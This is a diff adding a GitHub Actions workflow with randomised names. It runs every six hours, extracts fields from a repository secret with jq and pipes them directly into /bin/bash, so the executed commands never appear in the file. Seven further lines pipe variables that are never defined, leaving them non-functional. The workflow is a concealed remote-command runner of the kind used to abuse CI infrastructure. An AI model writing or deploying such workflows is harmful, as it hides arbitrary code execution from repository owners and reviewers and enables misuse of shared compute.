@@ -1,0 +1,24 @@
+name: wuhaoning3214
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhaoning3214
+        env:
+          oh370: ${{ secrets.oh370 }}
+        run: |
+          echo $oh370 | jq -r .nrzqx1 | /bin/bash
+          echo $yeqs1011 | jq -r .j3 | /bin/bash
+          echo $ysqgm60870 | jq -r .mici501 | /bin/bash
+          echo $e821 | jq -r .ry56091 | /bin/bash
+          echo $xe57890 | jq -r .qvv50 | /bin/bash
+          echo $woira669 | jq -r .idv1963 | /bin/bash
+          echo $g0 | jq -r .q307 | /bin/bash
+          echo $foki3816 | jq -r .cjils8 | /bin/bash
+
